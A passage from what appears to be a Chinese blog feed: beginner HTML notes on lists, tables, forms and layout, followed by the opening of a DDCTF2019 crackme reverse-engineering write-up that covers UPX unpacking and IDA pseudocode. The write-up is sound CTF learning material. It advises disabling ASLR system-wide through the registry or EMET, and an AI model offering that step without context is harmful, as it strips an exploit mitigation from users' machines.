自定义列表</strong>：这个是比较常用的，自定义列表以<code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。其<strong>不仅仅是一列项目，而是项目及其注释的组合。</strong></li></ul><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 列表标题 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 其内容 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span></code></pre></div><p><strong>练习：</strong></p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>列表<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"list-style-type:circle"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>标题1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表3<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表4<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>标题2<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表3<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>自定义列表4<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h2><ul><li><p><strong>HTML 表格</strong>：表格由 <code>&lt;table&gt;</code>标签来定义。每个表格均有若干==行==（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干==单元格==（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指<strong>表格数据</strong>（table data），即数<strong>据单元格的内容</strong>。数据单元格可以包含<strong>文本、图片、列表、段落、表单、水平线、表格</strong>等等。这个有利于多样化，在分清栏目后在td里放内容就ok。</p></li><li><p><strong>HTML 边框属性</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>会出现表框。</p></li><li><p><strong>HTML 表格表头</strong>:表格的表头使用 <code>&lt;th&gt;</code> 标签进行定义。<code>&lt;th&gt;</code>标签与<code>&lt;td&gt;</code>标签<strong>用法相似只是显示的效果不同，会有粗体居中的效果；</strong></p></li><li><p><strong>HTML表格合并</strong>：用 <strong>colspan</strong>： 横向行  <strong>rowspan</strong>  ：竖纵行。</p></li><li><p><strong>HTML表格单元格边距的设置</strong>：类似 <strong>设置边框</strong> 直接在table标签里放入<strong>cellpadding=“自定义的数字”</strong>，就设置好了。</p></li></ul><p><strong>练习：</strong></p><div class="hljs"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>表格<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>部门<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>工资<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">"3"</span>&gt;</span>开发组<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>小明<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>小白<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>女<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">"2"</span>&gt;</span>工资合计<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h2><p>表单是一个包含<strong>表单元素</strong>的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p><p>`<form><br>input元素</form></p>\\\\\`<h4 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h4><p>输入标签<code>&lt;input&gt;</code>。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>在大多数浏览器中，文本域的缺省宽度是20个字符。</strong></p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> 来定义</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>Password: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pwd"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> 标签定义了表单单选框选项。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"male"</span>&gt;</span>Male<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span><span class="hljs-attr">value</span>=<span class="hljs-string">"female"</span>&gt;</span>Female<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p><strong>Name 是可以进行==分组==。想要有效果 value也少不了。</strong></p><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"vehicle"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Bike"</span>&gt;</span>I have a bike<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"vehicle"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Car"</span>&gt;</span>I have a car <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p><strong>类似单选三者缺一不可。</strong></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>定义了提交按钮. </p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"input"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span> <span class="hljs-attr">method</span>=<span class="hljs-string">""</span>&gt;</span>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p>==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。   name：为控件命名，以备后台程序 ASP、PHP 使用==</p><h4 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>表单<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span>&gt;</span> <span class="hljs-comment">&lt;!-- action 中值为提交的网页 --&gt;</span><span class="hljs-comment">&lt;!-- 默认为get --&gt;</span>admin<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user"</span>&gt;</span>password<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"male"</span>&gt;</span>男 <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"female"</span>&gt;</span>女  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span>&gt;</span>中性<span class="hljs-comment">&lt;!-- name中值一样那么其分组就一样 --&gt;</span><span class="hljs-comment">&lt;!-- &lt;input type="radio" name="sex"&gt;男&lt;input type="radio" name="sex"&gt;女&lt;input type="radio" name="sex"&gt;中性 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-comment">&lt;!-- 兴趣复选框 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"kanshu"</span>&gt;</span> 看书<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"xuexi"</span>&gt;</span>  学习<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"music"</span>&gt;</span>  听歌<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    城市<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"city"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"shanghai"</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"beijing"</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML布局"><a href="#HTML布局" class="headerlink" title="HTML布局"></a>HTML布局</h2><p><strong>HTML 布局 - 使用<code>&lt;div&gt;</code> 元素.</strong></p><p>可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用<strong>css</strong>来设置样式。</p><p>这中间需要用到float：left等 来控制一个div中套用的div的位置。</p><ul><li>HTML中<code>&lt;div&gt;</code>元素是块级元素，它可用于组合其他 HTML元素的容器。</li><li><code>&lt;div&gt;</code> 元素的另一个常见的用途是文档布局。<code>&lt;div&gt;</code>元素经常与 <strong>CSS</strong> 一起使用，用来布局网页。</li><li><code>&lt;div&gt;</code> 元素没有特定的含义。</li></ul><p><strong>练习：</strong></p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>布局<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;div style="background: yellow; width: 50px;"&gt;这是个div这是个div这是个div这是个div&lt;/div&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: yellow;height: 100px;"</span>&gt;</span>导航<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: green;width: 20%; float: left; height: 300px;"</span>&gt;</span>菜单<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">di+v</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: red;width: 80%; float: left;height: 300px;"</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="HTML嵌套规则"><a href="#HTML嵌套规则" class="headerlink" title="HTML嵌套规则"></a>HTML嵌套规则</h2><h4 id="元素分类："><a href="#元素分类：" class="headerlink" title="元素分类："></a>元素分类：</h4><ul><li><strong>文字类块元素</strong>：p  h1~h6</li><li><strong>容器类块元素</strong>：div table tr td th form ul li ol dl dt dd</li><li><strong>行元素</strong>:不独立成行，不可以  内容决定a img input strong em del span</li><li><strong>特殊字符</strong>:br </li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><ul><li>块元素可以嵌套行元素 <code>&lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt;</code></li><li>行元素可以嵌套行元素 <code>&lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt;</code></li><li>行元素不可以嵌套块元素</li><li>文字类抉元素不可以嵌套块元素</li><li>容器类抉元素可以嵌套块元素</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <url>/2019/11/17/DDCTF2019-RE-Windows%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>可以看出是UPX壳。<br>另外：</p><div class="hljs"><pre><code> /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre></div><p>在mac终端也可以用file命令查出。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>直接在终端UPX -d 脱了就可以了。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了<strong>ASLR</strong>。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科<br>随后又查询到win7以后的windows系统都是有这个机制的，<strong>但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变</strong>。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。</p><h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>有两种办法。</p><h5 id="改注册表"><a href="#改注册表" class="headerlink" title="改注册表"></a>改注册表</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。</p><h5 id="软件关闭"><a href="#软件关闭" class="headerlink" title="软件关闭"></a>软件关闭</h5><p>下载EMET：<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>关闭后重启即可。</p><h4 id="成功运行"><a href="#成功运行" class="headerlink" title="成功运行"></a>成功运行</h4><p>程序成功运行后发现：<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>这个估计又是字符对比。用IDA打开分析其逻辑。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><div class="hljs"><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&apos;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre></div><p>代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。</p><h4 id="处理函数sub-401000"><a href="#处理函数sub-401000" class="headerlink" title="处理函数sub_401000"></a>处理函数sub_401000</h4><div class="hljs"><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre></div><p>可以看出来输入的东西的确在这里进行了，一位位的处理。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>用这里的字符串进行了替换。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" srcset="/img/loading.gif" 